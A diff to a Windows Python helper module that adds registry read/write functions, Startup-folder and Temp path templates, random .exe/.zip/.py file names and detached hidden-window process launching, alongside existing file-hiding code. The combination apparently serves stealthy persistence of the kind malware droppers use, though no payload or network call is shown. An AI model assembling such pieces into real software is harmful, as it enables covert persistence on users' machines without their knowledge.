@@ -1,25 +1,72 @@
 import ctypes
 from ctypes import wintypes
-from ctypes import create_string_buffer, wstring_at
-from ctypes import Structure, Union, POINTER
-from ctypes import byref, pointer, cast
 import os
 import platform
 import random
-import shutil
 import string
 import subprocess
 import sys
 import requests
-import ast
 import winreg
 from base64 import b64encode
 from zipfile import ZipFile
 requests.packages.urllib3.disable_warnings()
 startupinfo = subprocess.STARTUPINFO()
 startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+startupFolder = "c:/users/{}/appdata/roaming/microsoft/windows/start menu/programs/startup/{}"
+tempFolder = "c:/users/{}/appdata/local/temp/{}"
+BaseTempFolder = "c:/users/{}/appdata/local/temp"
+TypicalRegistryKey = "SOFTWARE\Microsoft"
 
 
+def setRegistryKey(key_name: str, value: str, registry_path: str, HKLM: bool = False) -> bool:
+    """
+    :param key_name: registry key name
+    :type key_name: str
+    :param value: registry value
+    :type value: str
+    :param registry_path: full path to registry key
+    :type registry_path: str
+    :param HKLM: is HKLM
+    :type HKLM: bool
+    :return: bool
+    """
+    try:
+        if HKLM:
+            base_path = winreg.HKEY_LOCAL_MACHINE
+        else:
+            base_path = winreg.HKEY_CURRENT_USER
+        winreg.CreateKey(base_path, registry_path)
+        registry_key = winreg.OpenKey(base_path, registry_path, 0,
+                                       winreg.KEY_WRITE)
+        winreg.SetValueEx(registry_key, key_name, 0, winreg.REG_SZ, value)
+        winreg.CloseKey(registry_key)
+        return True
+    except WindowsError:
+        return False
+
+def getRegistryKey(key_name: str, registry_path: str, HKLM: bool = False) -> str:
+    """
+    :param key_name: registry key name
+    :type key_name: str
+    :param registry_path: full path to registry key
+    :type registry_path: str
+    :param HKLM: is HKLM
+    :type HKLM: bool
+    :return: bool
+    """
+    try:
+        if HKLM:
+            base_path = winreg.HKEY_LOCAL_MACHINE
+        else:
+            base_path = winreg.HKEY_CURRENT_USER
+        registry_key = winreg.OpenKey(base_path, registry_path, 0,
+                                       winreg.KEY_READ)
+        value, regtype = winreg.QueryValueEx(registry_key, key_name)
+        winreg.CloseKey(registry_key)
+        return value
+    except WindowsError:
+        return None
 
 def extract_zip(extraction_path : str,file_to_extract : str) -> bool:
     """
@@ -33,15 +80,6 @@ def extract_zip(extraction_path : str,file_to_extract : str) -> bool:
     except Exception as e:
         print(e)
         return False
-
-def top_level_functions(body):
-    #//TODO 11: add doc
-    return (f for f in body if isinstance(f, ast.FunctionDef))
-
-
-def parse_ast(code):
-    #//TODO 12: add doc
-    return ast.parse(code)
 
 
 def is_online() -> bool:
@@ -60,14 +98,20 @@ def is_python_exist() -> bool:
     python_reg_value = "ExecutablePath"
     for python_minor_version in range(5, 10):
         try:
-            reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, python_reg_key.format(python_minor_version), 0,
-                                     winreg.KEY_READ)
-            value, regtype = winreg.QueryValueEx(reg_key, python_reg_value)
-            return True
-        except WindowsError:
+            if is_admin():
+                value = getRegistryKey(key_name=python_reg_value,
+                                       registry_path=python_reg_key.format(python_minor_version), HKLM=True)
+            else:
+                value = getRegistryKey(key_name=python_reg_value,
+                                       registry_path=python_reg_key.format(python_minor_version), HKLM=False)
+            if value:
+                return bool(value)
+        except Exception as e:
             continue
     for num in range(10, 45):
         if os.path.exists(f"C:/Users/{os.getlogin()}/Appdata/Local/Programs/Python/Python{num}/python.exe"):
+            return True
+        if os.path.exists(f"C:/Program Files/Python{num}/python.exe"):
             return True
     for location in possible_location:
         for file in os.listdir(location):
@@ -123,11 +167,21 @@ def hide_path(p : str):
     return ctypes.windll.kernel32.SetFileAttributesW(p, 0x02)
 
 
-def random_string(length : int):
+def random_string(length=0,is_random=False,is_zip=False,is_exe=False,is_py=False):
     """
     :param length: length of random string.
     """
-    return ''.join((random.choice(string.ascii_letters) for x in range(length)))
+    if is_random or not length:
+        length = random.randrange(5,15)
+    base_str = ''.join((random.choice(string.ascii_letters) for x in range(length)))
+    if is_zip:
+        return base_str + '.zip'
+    elif is_exe:
+        return base_str + '.exe'
+    elif is_py:
+        return base_str + '.py'
+    else:
+        return base_str
 
 
 def run_pwsh(code : str):
@@ -138,6 +192,21 @@ def run_pwsh(code : str):
     """
     p = subprocess.run(['powershell', code], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
     return p.stdout.decode()
+
+def run_detached_process(code : str,is_powershell=False) -> str :
+    DETACHED_NEW_WITH_CONSOLE = {
+        'close_fds': True,  # close stdin/stdout/stderr on child
+        'creationflags': 0x00000008 | 0x00000200,
+    }
+    si = subprocess.STARTUPINFO()
+    si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+    if is_powershell:
+        p = subprocess.run(code, shell=True, **DETACHED_NEW_WITH_CONSOLE)
+        return ""
+    else:
+        p = subprocess.Popen(code, stderr=subprocess.PIPE, stdout=subprocess.PIPE, **DETACHED_NEW_WITH_CONSOLE)
+    stdout, stderr = p.communicate()
+    return stdout
 
 
 def is_os_64bit() -> bool:
@@ -152,12 +221,17 @@ def find_python_path() -> str:
     python_reg_value = "ExecutablePath"
     for python_minor_version in range(5,10):
         try:
-            reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, python_reg_key.format(python_minor_version), 0,
-                    winreg.KEY_READ)
-            value, regtype = winreg.QueryValueEx(reg_key, python_reg_value)
-            return value
+            if is_admin():
+                value = getRegistryKey(key_name=python_reg_value,registry_path=python_reg_key.format(python_minor_version),HKLM=True)
+            else:
+                value = getRegistryKey(key_name=python_reg_value,registry_path=python_reg_key.format(python_minor_version),HKLM=False)
+            if value:
+                return value
         except WindowsError:
             continue
+    from_shell = ''.join([line.strip() for line in run_pwsh("where python").splitlines() if 'WindowsApps' not in line and 'python.exe' in line])
+    if from_shell:
+        return  from_shell
     return None
 
 
@@ -210,3 +284,18 @@ def ctypes_update_system():
     SMTO_NORMAL = 0x000
     SendMessageTimeout(HWND_BROADCAST, WM_SETTINGCHANGE, 0, 'Environment', SMTO_NORMAL, 10, 0)
     return
+
+
+
+def set_env_variable(name, value):
+    '''
+    :param name: environment variable name
+    :param value: environment variable value
+    '''
+
+    if os.environ.get(name):
+        if value in os.environ[name]:
+            return True
+        os.environ[name] = value + os.pathsep + os.environ[name]
+        return True
+    return False
